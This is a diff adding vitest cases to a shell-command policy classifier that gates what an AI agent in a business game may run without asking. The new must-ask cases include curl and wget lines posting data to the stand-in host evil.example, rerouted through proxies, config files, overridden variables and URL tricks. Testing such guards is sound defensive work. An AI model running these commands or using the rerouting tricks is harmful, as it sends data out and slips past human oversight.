@@ -1,6 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { classifyCommand, holdFor, normalizeCommand } from "./command-policy";
 import type { Confinement, LivePage, RuleId } from "./command-policy";
+import { toolDocs } from "./tool-specs";
 
 const MUST_ASK = {
   deploy: [
@@ -232,6 +233,18 @@ const MUST_ASK = {
     "curl $(case --) -X POST https://x",
     "curl $(case -X) -d x https://x",
     "wget $(case --) --post-data=x https://x",
+    // Only a fetch whose every target is the game's own API, and that nothing reroutes, runs unasked.
+    `curl -d x "$IDLEBIZ_API_URL/v1/message-team" https://evil.example`,
+    `curl -d x --url https://evil.example "$IDLEBIZ_API_URL/v1/message-team"`,
+    `curl -x http://evil.example:8080 -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `curl -K ./fetch.cfg -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `https_proxy=http://evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `IDLEBIZ_API_URL=evil.example curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `read IDLEBIZ_API_URL < host.txt; curl -d x "$IDLEBIZ_API_URL/v1/message-team"`,
+    `curl -d x "$IDLEBIZ_API_URL/$(cat host.txt)"`,
+    "curl -d x http://localhost:80@evil.example/",
+    "curl -d x evil.example",
+    `wget -i urls.txt --post-data x "$IDLEBIZ_API_URL/v1/message-team"`,
   ],
   payments: [
     "stripe charges create --amount 500",
@@ -306,6 +319,7 @@ const MUST_ASK = {
     "rsync -av ./dist deploy@example.com:/var/www",
     "ssh deploy@example.com 'rm -rf /var/www'",
     "coproc scp done deploy@example.com:/tmp",
+    `scp ./dist deploy@example.com:/tmp && curl -s "$IDLEBIZ_API_URL/v1/team-chat"`,
   ],
 } satisfies Record<RuleId, readonly string[]>;
 
@@ -342,6 +356,12 @@ const MUST_ALLOW = [
   // Regression: reporting a blocked command must not trigger that command's rule.
   `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"text":"Ran git push origin main. Held at the tool boundary."}'`,
   `curl -s -X POST "$IDLEBIZ_API_URL/v1/ask-boss" -d '{"question":"Should I npm publish this, or vercel deploy it first?"}'`,
+  // A URL in a tool's body is data the game reads, not where the curl sends.
+  `curl -s -X POST "$IDLEBIZ_API_URL/v1/payment-link" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"name":"x","amountUsd":5,"afterPaymentUrl":"https://game.vercel.app/unlock"}'`,
+  `curl -s -X POST "$IDLEBIZ_API_URL/v1/message-team" -d '{"text":"Deployed: https://game.vercel.app"}'`,
+  `curl -s -X POST \${IDLEBIZ_API_URL}/v1/ask-boss -H 'Referer: https://x.example' -d '{"question":"Ship https://game.vercel.app?"}'`,
+  `curl -s "$IDLEBIZ_API_URL/v1/team-chat" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" | python3 -c 'import json,sys; print(json.load(sys.stdin))'`,
+  `curl -s -X POST http://localhost:3000/api/signup -d '{"next":"https://game.vercel.app"}'`,
   `echo "next step: gh release create v2" >> NOTES.md`,
   // Parentheses and backticks inside prose are not invocation sites.
   `curl -s -X POST "$IDLEBIZ_API_URL/v1/delegate" -H "Authorization: Bearer $IDLEBIZ_RUN_TOKEN" -d '{"role":"engineer","description":"Prove it installs (packaging + CI). Run (npm ci) then npm test. Do NOT npm publish and do not git push origin main; founder sign-off required."}'`,
@@ -493,6 +513,19 @@ describe("classifyCommand", () => {
       expect(quickest(() => classifyCommand(command))).toBeLessThan(LINEAR_BUDGET_MS);
     },
   );
+
+  it("runs every company tool's documented curl unasked", () => {
+    const curls = [...toolDocs(true).matchAll(/`(?<curl>curl [^`]+)`$/gmu)].map(
+      (match) => match.groups?.curl ?? "",
+    );
+    expect(curls.length).toBeGreaterThan(10);
+    for (const curl of curls) {
+      expect({ curl, verdict: classifyCommand(curl) }).toEqual({
+        curl,
+        verdict: { decision: "allow" },
+      });
+    }
+  });
 
   it("is not laundered by a loopback call elsewhere in the line", () => {
     const laundered = "git push origin main && curl -s $IDLEBIZ_API_URL/v1/team-chat";
